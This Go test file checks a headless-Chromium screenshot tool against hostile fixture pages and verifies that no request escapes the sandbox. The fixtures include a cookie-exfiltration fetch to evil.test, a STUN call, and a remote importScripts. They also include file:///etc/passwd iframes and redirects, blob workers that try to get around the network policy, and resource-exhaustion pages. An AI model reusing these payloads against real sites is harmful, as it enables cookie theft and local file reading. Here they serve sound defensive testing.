package webshot

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image"
	_ "image/jpeg"
	_ "image/png"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/openctemio/sdk-go/pkg/testkit"
	"github.com/openctemio/sdk-go/pkg/tool"
	"github.com/openctemio/sensor/internal/egressenv"
)

// The tests below drive a real Chromium against hostile fixture pages. They
// run where WEBSHOT_BROWSER names the browser binary (CI runs them in the
// browser image under the sensor's seccomp profile, Chromium's own sandbox
// on). The fixture server stands in for the task's egress forwarder: the
// browser's only proxy. Every request it sees is recorded, so a test proves
// what never left the browser.

type seen struct {
	Method, Host, Path string
	Header             http.Header
}

type fixtureProxy struct {
	mu   sync.Mutex
	reqs []seen
	url  string
}

func (f *fixtureProxy) requests() []seen {
	f.mu.Lock()
	defer f.mu.Unlock()
	return append([]seen(nil), f.reqs...)
}

const homePage = `<!doctype html><html><head><title>Fixture home</title>
<link rel="stylesheet" href="/s.css"></head><body style="background:#0a1628;color:#fff">
<h1>Hello from the fixture</h1>
<img src="http://evil.test/pixel.png">
<img src="http://127.0.0.1:9/loop.png">
<iframe src="file:///etc/passwd"></iframe>
<form id="f" method="post" action="/login"><input name="u" value="x"></form>
<script>
fetch('http://evil.test/exfil?c=' + document.cookie).catch(()=>{});
fetch('/api', {method: 'POST', body: 'x'}).catch(()=>{});
fetch('/api', {method: 'DELETE'}).catch(()=>{});
navigator.sendBeacon('/beacon', 'x');
try { new WebSocket('ws://app.test/ws'); } catch (e) {}
try { new RTCPeerConnection({iceServers: [{urls: 'stun:evil.test:3478'}]}).createDataChannel('x'); } catch (e) {}
try { navigator.serviceWorker.register('/sw.js'); } catch (e) {}
window.open('http://evil.test/popup');
document.getElementById('f').submit();
</script></body></html>`

// startFixtureProxy serves the fixture for app.test; root, when set, is the
// page "/" answers as (a target is an origin, so a case's page is its root).
func startFixtureProxy(t *testing.T, root string) *fixtureProxy {
	t.Helper()
	f := &fixtureProxy{}
	h := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if root != "" && r.URL.Path == "/" {
			r.URL.Path = root
		}
		f.mu.Lock()
		host := r.Host
		if h, _, err := net.SplitHostPort(host); err == nil {
			host = h
		}
		f.reqs = append(f.reqs, seen{Method: r.Method, Host: host, Path: r.URL.Path, Header: r.Header.Clone()})
		f.mu.Unlock()
		if r.Method == http.MethodConnect || host != "app.test" {
			http.Error(w, "refused by the fixture forwarder", http.StatusForbidden)
			return
		}
		w.Header().Set("Server", "fixture/1")
		switch r.URL.Path {
		case "/":
			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			_, _ = w.Write([]byte(homePage))
		case "/s.css":
			w.Header().Set("Content-Type", "text/css")
			_, _ = w.Write([]byte("h1{font-size:40px}"))
		case "/loop":
			w.Header().Set("Content-Type", "text/html")
			_, _ = w.Write([]byte(`<title>Loop</title><h1>looping</h1><script>setTimeout(function(){for(;;){}}, 10)</script>`))
		case "/loop-sync":
			w.Header().Set("Content-Type", "text/html")
			_, _ = w.Write([]byte(`<title>Sync loop</title><h1>before</h1><script>for(;;){}</script>`))
		case "/alerts":
			w.Header().Set("Content-Type", "text/html")
			_, _ = w.Write([]byte(`<title>Alerts</title><h1>alerts</h1><script>for(var i=0;i<100000;i++){alert(i);confirm(i);prompt(i)}</script>`))
		case "/canvas":
			w.Header().Set("Content-Type", "text/html")
			_, _ = w.Write([]byte(`<title>Huge</title><body style="margin:0;height:200000px;width:40000px">` +
				`<canvas id="c" width="16000" height="16000"></canvas><script>var x=document.getElementById('c').getContext('2d');` +
				`x.fillStyle='#08a';x.fillRect(0,0,16000,16000);</script></body>`))
		case "/download":
			w.Header().Set("Content-Type", "application/octet-stream")
			w.Header().Set("Content-Disposition", `attachment; filename="payload.bin"`)
			_, _ = w.Write(bytes.Repeat([]byte{0x41}, 4096))
		case "/to-file":
			http.Redirect(w, r, "file:///etc/passwd", http.StatusFound)
		case "/to-evil":
			http.Redirect(w, r, "http://evil.test/", http.StatusFound)
		case "/blob-worker":
			// A worker made from a blob has no network policy of its own to
			// inherit: its POST must still be refused.
			w.Header().Set("Content-Type", "text/html")
			_, _ = w.Write([]byte(`<title>Blob worker</title><h1>worker</h1><script>
var src = "fetch('/worker-post', {method: 'POST', body: 'x'}).catch(function(){});" +
  "fetch('http://app.test/worker-delete', {method: 'DELETE'}).catch(function(){});" +
  "try { new WebSocket('ws://app.test/worker-ws'); } catch (e) {}";
try { new Worker(URL.createObjectURL(new Blob([src], {type: 'text/javascript'}))); } catch (e) {}
</script>`))
		case "/shared-worker":
			// A shared worker outlives its page: refused by policy.
			w.Header().Set("Content-Type", "text/html")
			_, _ = w.Write([]byte(`<title>Shared worker</title><h1>shared</h1><script>
var src = "fetch('/shared-post', {method: 'POST', body: 'x'}).catch(function(){});" +
  "fetch('http://app.test/shared-delete', {method: 'DELETE'}).catch(function(){});";
try { new SharedWorker(URL.createObjectURL(new Blob([src], {type: 'text/javascript'}))).port.start(); } catch (e) {}
try { new SharedWorker('/shared-worker.js').port.start(); } catch (e) {}
</script>`))
		case "/shared-worker.js":
			w.Header().Set("Content-Type", "text/javascript")
			_, _ = w.Write([]byte(`fetch('/shared-url-delete', {method: 'DELETE'}).catch(function(){});`))
		case "/nested-worker":
			// A worker that starts a worker of its own, from a blob and from
			// a URL of the target.
			w.Header().Set("Content-Type", "text/html")
			_, _ = w.Write([]byte(`<title>Nested worker</title><h1>nested</h1><script>
var inner = "fetch('http://app.test/nested-delete', {method: 'DELETE'}).catch(function(){});";
var outer = "var inner = " + JSON.stringify(inner) + ";" +
  "try { new Worker(URL.createObjectURL(new Blob([inner], {type: 'text/javascript'}))); } catch (e) {}" +
  "try { new Worker('http://app.test/worker.js'); } catch (e) {}" +
  "fetch('http://app.test/outer-delete', {method: 'DELETE'}).catch(function(){});";
try { new Worker(URL.createObjectURL(new Blob([outer], {type: 'text/javascript'}))); } catch (e) {}
try { new Worker('/worker.js'); } catch (e) {}
</script>`))
		case "/worker.js":
			w.Header().Set("Content-Type", "text/javascript")
			_, _ = w.Write([]byte(`fetch('/url-worker-delete', {method: 'DELETE'}).catch(function(){});` +
				`try { importScripts('http://evil.test/import.js'); } catch (e) {}`))
		case "/iframe-ws":
			// A WebSocket opened from the realm of a nested frame.
			w.Header().Set("Content-Type", "text/html")
			_, _ = w.Write([]byte(`<title>Frame socket</title><h1>frame</h1>
<iframe srcdoc="<script>try { new WebSocket('ws://app.test/frame-ws'); } catch (e) {}</script>"></iframe>
<script>
var f = document.createElement('iframe');
f.onload = function () { try { new f.contentWindow.WebSocket('ws://app.test/frame-ws2'); } catch (e) {} };
document.body.appendChild(f);
</script>`))
		case "/many":
			w.Header().Set("Content-Type", "text/html")
			var b strings.Builder
			b.WriteString("<title>Many</title>")
			for i := 0; i < 400; i++ {
				fmt.Fprintf(&b, `<img src="/img/%d.png">`, i)
			}
			_, _ = w.Write([]byte(b.String()))
		default:
			http.NotFound(w, r)
		}
	})
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	srv := &http.Server{Handler: h, ReadHeaderTimeout: 5 * time.Second}
	go func() { _ = srv.Serve(ln) }()
	t.Cleanup(func() { _ = srv.Close() })
	f.url = "http://" + ln.Addr().String()
	return f
}

func realBrowser(t *testing.T) string {
	t.Helper()
	bin := os.Getenv("WEBSHOT_BROWSER")
	if bin == "" {
		t.Skip("WEBSHOT_BROWSER is not set (the browser image's CI job sets it)")
	}
	return bin
}

// runCapture runs the tool in-process (test kit) on one origin, with the
// fixture as the task's forwarder and the job's identification set.
func runCapture(t *testing.T, f *fixtureProxy, bin string, cfg Config, value string) *testkit.Result {
	t.Helper()
	t.Setenv(egressenv.EnvProxy, f.url)
	local, _ := json.Marshal(Local{Browser: bin})
	c, _ := json.Marshal(cfg)
	task := tool.Task{
		Capability: "capture.screenshot@1",
		Targets:    []tool.Target{{Ref: "t0", Type: "web_origin", Value: value}},
		Config:     c,
		Local:      local,
		Identity:   &tool.Identity{UserAgent: "openctem-test-agent", Headers: map[string]string{"X-Program": "bb-42"}},
	}
	return testkit.Run(t, Tool, task, testkit.Options{Timeout: 2 * time.Minute})
}

func capturedEvidence(t *testing.T, r *testkit.Result) map[string]any {
	t.Helper()
	if r.Report == nil || len(r.Report.Assets) != 1 {
		t.Fatalf("want one asset, got report %+v err %+v targets %+v", r.Report, r.Err, r.Targets)
	}
	list, _ := r.Report.Assets[0].Properties[PropertyKey].([]any)
	if len(list) != 1 {
		t.Fatalf("web_evidence %v", r.Report.Assets[0].Properties)
	}
	ev, _ := list[0].(map[string]any)
	return ev
}

func decodeShot(t *testing.T, ev map[string]any) image.Config {
	t.Helper()
	s, ok := ev["screenshot"].(map[string]any)
	if !ok {
		t.Fatalf("no screenshot in %v", keys(ev))
	}
	raw, err := base64.StdEncoding.DecodeString(s["data"].(string))
	if err != nil || len(raw) > 640<<10 {
		t.Fatalf("screenshot %d bytes, %v", len(raw), err)
	}
	cfg, _, err := image.DecodeConfig(bytes.NewReader(raw))
	if err != nil {
		t.Fatal(err)
	}
	return cfg
}

func num(v any) int {
	switch n := v.(type) {
	case int:
		return n
	case float64:
		return int(n)
	}
	return -1
}

func keys(m map[string]any) []string {
	var out []string
	for k := range m {
		out = append(out, k)
	}
	return out
}

// SECURITY: a hostile page gets its picture taken and nothing else: no
// request leaves the browser to another host, with another method, to a
// file or over WebSocket/WebRTC; the job's identification is on every
// request; downloads and popups do not happen.
func TestRealBrowserHostilePage(t *testing.T) {
	bin := realBrowser(t)
	f := startFixtureProxy(t, "")
	start := time.Now()
	r := runCapture(t, f, bin, Config{PageTimeout: 10}, "http://app.test")
	ev := capturedEvidence(t, r)
	if ev["title"] != "Fixture home" || num(ev["status_code"]) != 200 || ev["server"] != "fixture/1" {
		t.Errorf("evidence title %v status %v server %v", ev["title"], ev["status_code"], ev["server"])
	}
	if dir := os.Getenv("WEBSHOT_DUMP"); dir != "" {
		s := ev["screenshot"].(map[string]any)
		raw, _ := base64.StdEncoding.DecodeString(s["data"].(string))
		_ = os.WriteFile(dir+"/home.png", raw, 0o600)
	}
	if c := decodeShot(t, capturedEvidence(t, r)); c.Width != viewportWidth || c.Height != viewportHeight {
		t.Errorf("viewport capture %dx%d", c.Width, c.Height)
	}
	for _, s := range f.requests() {
		if s.Host != "app.test" {
			t.Errorf("a request reached the forwarder for %s%s", s.Host, s.Path)
		}
		if s.Method != http.MethodGet && s.Method != http.MethodHead {
			t.Errorf("%s %s reached the forwarder", s.Method, s.Path)
		}
		if s.Header.Get("User-Agent") != "openctem-test-agent" || s.Header.Get("X-Program") != "bb-42" {
			t.Errorf("%s %s without the job's identification: %v", s.Method, s.Path, s.Header)
		}
		if s.Path == "/login" || s.Path == "/beacon" || s.Path == "/ws" || s.Path == "/sw.js" {
			t.Errorf("%s %s reached the forwarder", s.Method, s.Path)
		}
	}
	if time.Since(start) > time.Minute {
		t.Errorf("capture took %s", time.Since(start))
	}
}

// SECURITY: a page's workers and nested frames get no way around the
// page's policy: a worker (dedicated from a blob or a URL, nested, or
// shared) never runs its script, so it cannot POST, DELETE or import a
// script from elsewhere, not even while its page closes; a WebSocket opened
// from an iframe's realm never connects.
func TestRealBrowserWorkerAndFrameRealms(t *testing.T) {
	bin := realBrowser(t)
	for _, c := range []struct {
		name, root string
		never      []string
	}{
		{"blob worker", "/blob-worker", []string{"/worker-post", "/worker-delete", "/worker-ws"}},
		{"shared worker", "/shared-worker", []string{"/shared-post", "/shared-delete", "/shared-url-delete"}},
		{"nested worker", "/nested-worker", []string{"/nested-delete", "/outer-delete", "/url-worker-delete"}},
		{"iframe websocket", "/iframe-ws", []string{"/frame-ws", "/frame-ws2"}},
	} {
		t.Run(c.name, func(t *testing.T) {
			f := startFixtureProxy(t, c.root)
			r := runCapture(t, f, bin, Config{PageTimeout: 10}, "http://app.test")
			capturedEvidence(t, r) // the page is still captured
			for _, s := range f.requests() {
				if s.Method != http.MethodGet && s.Method != http.MethodHead {
					t.Errorf("%s %s reached the forwarder", s.Method, s.Path)
				}
				if s.Host != "app.test" {
					t.Errorf("a request reached the forwarder for %s%s", s.Host, s.Path)
				}
				for _, p := range c.never {
					if s.Path == p {
						t.Errorf("%s %s reached the forwarder", s.Method, s.Path)
					}
				}
			}
		})
	}
}

// Pages that loop, spam dialogs or claim a huge size are captured within
// the time budget and the pixel caps; a download, a redirect to a file and
// a redirect out of scope produce no file and no request elsewhere.
func TestRealBrowserResourceAbuse(t *testing.T) {
	bin := realBrowser(t)
	cases := []struct {
		path     string
		fullPage bool
		check    func(t *testing.T, r *testkit.Result)
	}{
		{"/loop", false, func(t *testing.T, r *testkit.Result) {
			if ev := capturedEvidence(t, r); num(ev["status_code"]) != 200 {
				t.Errorf("loop page: %v", ev)
			}
		}},
		{"/loop-sync", false, func(t *testing.T, r *testkit.Result) { capturedEvidence(t, r) }},
		{"/alerts", false, func(t *testing.T, r *testkit.Result) { capturedEvidence(t, r) }},
		{"/canvas", true, func(t *testing.T, r *testkit.Result) {
			c := decodeShot(t, capturedEvidence(t, r))
			if c.Width > viewportWidth || c.Height > fullPageMaxHeight {
				t.Errorf("huge page captured at %dx%d", c.Width, c.Height)
			}
		}},
		{"/many", false, func(t *testing.T, r *testkit.Result) { capturedEvidence(t, r) }},
	}
	for _, c := range cases {
		t.Run(strings.Trim(c.path, "/"), func(t *testing.T) {
			f := startFixtureProxy(t, c.path)
			start := time.Now()
			r := runCapture(t, f, bin, Config{PageTimeout: 5, FullPage: c.fullPage, MaxRequests: 50}, "http://app.test")
			if d := time.Since(start); d > 45*time.Second {
				t.Errorf("%s took %s", c.path, d)
			}
			c.check(t, r)
			if c.path == "/many" {
				n := 0
				for _, s := range f.requests() {
					if strings.HasPrefix(s.Path, "/img/") {
						n++
					}
				}
				if n > 50 {
					t.Errorf("%d image requests passed a budget of 50", n)
				}
			}
		})
	}
	for _, path := range []string{"/download", "/to-file", "/to-evil"} {
		t.Run(strings.Trim(path, "/"), func(t *testing.T) {
			f := startFixtureProxy(t, path)
			r := runCapture(t, f, bin, Config{PageTimeout: 5}, "http://app.test")
			for _, s := range f.requests() {
				if s.Host != "app.test" {
					t.Errorf("%s: a request reached the forwarder for %s", path, s.Host)
				}
			}
			if r.Report != nil {
				for _, a := range r.Report.Assets {
					list, _ := a.Properties[PropertyKey].([]any)
					for _, e := range list {
						ev, _ := e.(map[string]any)
						if fu, _ := ev["final_url"].(string); strings.HasPrefix(fu, "file:") {
							t.Errorf("%s: evidence %v", path, ev)
						}
					}
				}
			}
			assertNoDownload(t)
		})
	}
}

// assertNoDownload: no downloaded file anywhere the browser could write
// (the profile and temp directories are in the task directory, which the
// test kit removes; Chromium's default download directory is under HOME).
func assertNoDownload(t *testing.T) {
	t.Helper()
	home, _ := os.UserHomeDir()
	for _, d := range []string{home + "/Downloads", os.TempDir()} {
		entries, _ := os.ReadDir(d)
		for _, e := range entries {
			if strings.Contains(e.Name(), "payload") {
				t.Errorf("a download landed in %s: %s", d, e.Name())
			}
		}
	}
}
